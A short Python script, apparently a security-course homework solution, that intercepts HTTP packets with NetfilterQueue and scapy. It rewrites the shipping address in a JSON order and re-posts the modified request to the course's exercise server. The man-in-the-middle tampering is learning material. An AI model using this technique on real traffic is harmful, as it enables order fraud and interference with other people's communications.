from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP
import re
import requests
import json

def print_and_accept(pkt):
    regex = re.compile("/ex3/shipping")
    pkt.accept()

    ip = IP(pkt.get_payload())

    if ip["TCP"].dport == 80:
    	if ip.haslayer("Raw"):
    		http = ip["Raw"].load.decode()

    		if regex.search(http):
    			print("HTTP:")
    			print(http)
    			print("\nIP.show():")
    			print(ip.show())
    			
    			new_msg = json.loads(http.splitlines()[-1])
    			new_msg["shipping_address"] = "martin.vold@epfl.ch"
    			
    			ip["Raw"].load = new_msg
    			print("\nIP.show() nr. 2:")
    			print(ip.show())

    			answer = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", data=json.dumps(new_msg), headers={"Content-Type": "application/json"})
    			print("\nAnswer code:")
    			print(answer.status_code)
    			print("\nAnswer text:")
    			print(answer.text)



nfqueue = NetfilterQueue()
nfqueue.bind(0, print_and_accept, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()